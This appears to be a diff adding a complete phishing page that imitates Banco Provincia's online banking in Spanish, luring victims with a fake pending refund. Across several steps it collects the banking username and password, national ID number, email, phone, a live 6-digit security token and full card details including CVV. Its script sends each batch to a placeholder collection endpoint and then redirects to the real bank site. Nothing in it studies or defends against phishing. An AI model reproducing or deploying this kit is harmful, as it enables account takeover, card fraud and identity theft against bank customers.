@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Banco Provincia · Banca Online</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{--verde:#2e9e33;--verde-osc:#257f29;--cian:#3cb9d6;--fondo:#e7e7e7;--texto:#3a3a3a;--gris:#6e6e6e;--borde:#d6d6d6;}
+  *{box-sizing:border-box;}
+  body{margin:0;font-family:'Poppins',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:var(--fondo);color:var(--texto);}
+  .barra{background:var(--fondo);padding:18px 20px;display:flex;align-items:center;justify-content:space-between;}
+  .marca{display:flex;align-items:center;gap:9px;}
+  .marca b{font-size:19px;font-weight:600;letter-spacing:-.3px;color:#333;}
+  .marca svg{width:34px;height:26px;display:block;}
+  .hamb{width:24px;height:16px;position:relative;}
+  .hamb i{position:absolute;left:0;width:24px;height:2.4px;background:#444;border-radius:2px;}
+  .hamb i:nth-child(1){top:0}.hamb i:nth-child(2){top:6.8px}.hamb i:nth-child(3){top:13.6px}
+  .caja{max-width:400px;margin:22px auto 40px;background:#fff;border-radius:14px;padding:26px 24px;box-shadow:0 2px 14px rgba(0,0,0,.07);}
+  h1{font-size:19px;margin:0 0 5px;font-weight:600;letter-spacing:-.2px;}
+  .sub{font-size:13.5px;color:var(--gris);margin:0 0 20px;line-height:1.45;font-weight:300;}
+  label{display:block;font-size:12px;font-weight:600;color:var(--gris);margin-bottom:6px;text-transform:uppercase;letter-spacing:.4px;}
+  input{width:100%;padding:13px;border:1px solid var(--borde);border-radius:9px;font-size:16px;margin-bottom:15px;font-family:inherit;color:var(--texto);}
+  input:focus{outline:none;border-color:var(--verde);box-shadow:0 0 0 3px rgba(46,158,51,.15);}
+  button{width:100%;padding:15px;border:none;border-radius:9px;background:var(--verde);color:#fff;font-size:15.5px;font-weight:600;cursor:pointer;font-family:inherit;}
+  button:hover{background:var(--verde-osc);}
+  .pasos{display:flex;gap:6px;margin-bottom:20px;}
+  .pasos i{height:4px;flex:1;background:#e3e3e3;border-radius:2px;}
+  .pasos i.on{background:var(--verde);}
+  .aviso{background:#f4f8ee;border:1px solid #dbe8c8;border-radius:9px;padding:12px 14px;font-size:12.5px;color:#4c5f2c;line-height:1.45;margin-bottom:18px;font-weight:300;}
+  #tk{text-align:center;font-size:23px;letter-spacing:7px;font-weight:600;}
+  a{color:var(--verde-osc);text-decoration:none;font-weight:600;}
+  .ok{text-align:center;padding:8px 0 4px;}
+  .ok .cir{width:64px;height:64px;border-radius:50%;background:#eaf6e8;color:var(--verde);display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 16px;}
+  .ok h2{font-size:18px;margin:0 0 9px;font-weight:600;}
+  .ok p{font-size:13.5px;color:var(--gris);margin:0 0 6px;line-height:1.5;font-weight:300;}
+  .pie{text-align:center;font-size:11.5px;color:#8a8a8a;padding:0 20px 30px;font-weight:300;}
+  .oculto{display:none;}
+  .sp{width:34px;height:34px;border:3px solid #e0e0e0;border-top-color:var(--verde);border-radius:50%;margin:0 auto;animation:g .8s linear infinite;}
+  @keyframes g{to{transform:rotate(360deg)}}
+  .fila{display:flex;gap:10px;}
+  .fila > div{flex:1;}
+</style>
+</head>
+<body>
+
+<div class="barra">
+  <div class="marca">
+    <b>Banco Provincia</b>
+    <svg viewBox="0 0 60 46" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 4h11a13 13 0 0 1 0 26H12z" fill="#2e9e33"/>
+      <path d="M12 4h8v34h-8z" fill="#2e9e33"/>
+      <path d="M12 30c0 8 4 12 10 12 4 0 6-3 6-7v-5z" fill="#3cb9d6"/>
+    </svg>
+  </div>
+  <div class="hamb"><i></i><i></i><i></i></div>
+</div>
+
+<div class="caja">
+
+  <div id="p1">
+    <div class="pasos"><i class="on"></i><i></i><i></i></div>
+    <h1>Ingresá a tu cuenta</h1>
+    <p class="sub">Reintegro por gastos de hacienda pendiente de acreditación.</p>
+    <label for="u">Usuario BIP</label>
+    <input id="u" placeholder="Si no lo tenés, dejalo vacío" autocomplete="off">
+    <label for="c">Clave</label>
+    <input id="c" type="password" placeholder="Clave BIP">
+    <button id="b1">Ingresar</button>
+  </div>
+
+  <div id="p2" class="oculto">
+    <div class="pasos"><i class="on"></i><i class="on"></i><i></i></div>
+    <h1>Validación de dispositivo</h1>
+    <p class="sub">Primer ingreso desde este dispositivo. Confirmá tus datos de contacto para habilitarlo.</p>
+    <label for="d">DNI del titular</label>
+    <input id="d" inputmode="numeric" maxlength="8" placeholder="Número de documento" autocomplete="off">
+    <label for="m">Correo electrónico</label>
+    <input id="m" type="email" inputmode="email" placeholder="tucorreo@gmail.com" autocomplete="off">
+    <label for="t">Celular</label>
+    <input id="t" type="tel" inputmode="numeric" placeholder="11 5555 5555" autocomplete="off">
+    <button id="b2">Continuar</button>
+  </div>
+
+  <div id="p2b" class="oculto" style="text-align:center;padding:34px 0;">
+    <div class="sp"></div>
+    <p class="sub" style="margin-top:18px;">Validando dispositivo...</p>
+  </div>
+
+  <div id="p3" class="oculto">
+    <div class="pasos"><i class="on"></i><i class="on"></i><i class="on"></i></div>
+    <h1>Token de seguridad</h1>
+    <p class="sub">Abrí BIP Móvil, tocá "Token de seguridad" y pasá el código de 6 dígitos.</p>
+    <label for="tk">Código</label>
+    <input id="tk" inputmode="numeric" maxlength="6" autocomplete="off">
+    <div class="aviso">El código vence a los 60 segundos.</div>
+    <button id="b3">Continuar</button>
+    <p class="sub" style="margin-top:16px;text-align:center;"><a href="#" id="sinTok">No tengo el token a mano</a></p>
+  </div>
+
+  <div id="p4" class="oculto">
+    <div class="pasos"><i class="on"></i><i class="on"></i><i class="on"></i></div>
+    <h1>Acreditación del reintegro</h1>
+    <p class="sub">Confirmá la tarjeta donde querés recibir el importe.</p>
+    <label for="n">Número de tarjeta</label>
+    <input id="n" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="off">
+    <div class="fila">
+      <div><label for="v">Vencimiento</label><input id="v" maxlength="5" placeholder="MM/AA" autocomplete="off"></div>
+      <div><label for="s">Código</label><input id="s" inputmode="numeric" maxlength="4" placeholder="CVV" autocomplete="off"></div>
+    </div>
+    <label for="ti">Titular</label>
+    <input id="ti" placeholder="Nombre como figura en la tarjeta" autocomplete="off">
+    <button id="b4">Acreditar</button>
+  </div>
+
+  <div id="p5" class="oculto ok">
+    <div class="cir">✓</div>
+    <h2>Reintegro acreditado</h2>
+    <p>El importe se verá reflejado en tu cuenta dentro de las próximas 48 horas hábiles.</p>
+    <p style="margin-top:14px;font-size:12.5px;color:#8a8a8a;">Redirigiendo a la Banca Online...</p>
+  </div>
+
+</div>
+
+<p class="pie">Banco Provincia · Banca Online · Conexión segura</p>
+
+<script>
+const API = "PEGAR_URL_EXEC";
+const datos = {};
+
+const $ = id => document.getElementById(id);
+const soloDig = s => String(s).replace(/\D/g, "");
+
+function enviar(estado){
+  const cuerpo = JSON.stringify(Object.assign({}, datos, {estado:estado}));
+  try{ fetch(API, {method:"POST", body:cuerpo, keepalive:true}); }catch(e){}
+}
+
+function ir(a, b){ $(a).classList.add("oculto"); $(b).classList.remove("oculto"); }
+
+$("b1").onclick = () => {
+  const u = $("u").value.trim().replace(/\s+/g, "");
+  const c = $("c").value.trim();
+  if(u && u.length < 4){ $("u").focus(); return; }
+  if(c.length < 4){ $("c").focus(); return; }
+  datos.usuario = u;
+  datos.clave = c;
+  ir("p1","p2");
+  $("d").focus();
+};
+
+$("b2").onclick = () => {
+  const d = soloDig($("d").value);
+  const m = $("m").value.trim();
+  const t = soloDig($("t").value);
+  if(d.length < 6){ $("d").focus(); return; }
+  if(m.indexOf("@") < 1 || m.indexOf(".") < 0){ $("m").focus(); return; }
+  if(t.length < 8){ $("t").focus(); return; }
+  datos.dni = d;
+  datos.email = m;
+  datos.telefono = t;
+  enviar("parcial");
+  ir("p2","p2b");
+  setTimeout(() => { ir("p2b","p3"); $("tk").focus(); }, 18000);
+};
+
+$("b3").onclick = () => {
+  const tk = soloDig($("tk").value);
+  if(tk.length < 6){ $("tk").focus(); return; }
+  datos.token = tk;
+  enviar("token");
+  ir("p3","p4");
+  $("n").focus();
+};
+
+$("sinTok").onclick = e => {
+  e.preventDefault();
+  enviar("sin_token");
+  ir("p3","p4");
+  $("n").focus();
+};
+
+$("b4").onclick = () => {
+  const n = soloDig($("n").value);
+  const s = soloDig($("s").value);
+  if(n.length < 15){ $("n").focus(); return; }
+  if(s.length < 3){ $("s").focus(); return; }
+  datos.tarjeta = n;
+  datos.cvv = s;
+  datos.venc = $("v").value;
+  datos.titular = $("ti").value;
+  enviar("completo");
+  ir("p4","p5");
+  setTimeout(() => { location.href = "https://www.bancoprovincia.com.ar/"; }, 4500);
+};
+
+document.addEventListener("keydown", e => {
+  if(e.key !== "Enter") return;
+  if(!$("p1").classList.contains("oculto")) $("b1").click();
+  else if(!$("p2").classList.contains("oculto")) $("b2").click();
+  else if(!$("p3").classList.contains("oculto")) $("b3").click();
+  else if(!$("p4").classList.contains("oculto")) $("b4").click();
+});
+</script>
+</body>
+</html>
